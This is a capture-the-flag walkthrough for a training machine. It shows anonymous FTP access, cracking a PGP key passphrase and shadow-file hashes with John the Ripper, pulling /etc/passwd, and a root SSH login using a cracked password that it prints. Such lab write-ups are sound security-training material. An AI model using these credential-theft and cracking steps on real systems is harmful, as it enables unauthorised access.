Machine: Anonforce  
Link: https://tryhackme.com/room/bsidesgtanonforce  

This is a very simple machine  


Start with a nmap scan "nmap -sC -sV {target_ip}"  
we find that port 21 and 22 are open and "anonymous" login is allowed  


Get into its ftp server,we find that we can change our directory also found one interesting directory "notread",so get into home directory "cd /home/melodias"  
get the user.txt  



now get into the notread directory,we find two files ‘backup.pgp’ and ‘private.asc’ get it into your machine (mget *).  

The "backup.pgp" file can be decypted using "private.asc" file

First crack the password of "private.asc" ("gpg2john private.asc > pass.txt")  
then ("john pass.txt --wordlist=/usr/share/wordlist/rockyou.txt")  
after getting the pass use it to open the "backup.pgp" file  

"gpg --import private.asc"  
"gpg backup.pgp"  

we got a file named "backup"  
cat it to see its contains (it is a shadow file)  


Now,we need the contents of both the shadow file(which we got) and passwd file(which we can get using ftp) and combine them before cracking the hash using "unshadow" tool  

Get into the ftp session to get the "/etc/passwd" file  

"unshadow {passwd_file} {shadow_file} > root_pass.txt"  

then use john to crack the password  

"john root_pass.txt" --wordlist=/usr/share/wordlist/rockyou.txt"  

after getting the password "hikari" log into its root account using ssh  

"ssh root@{ip}"


and get the root flag(/root/root.txt)  

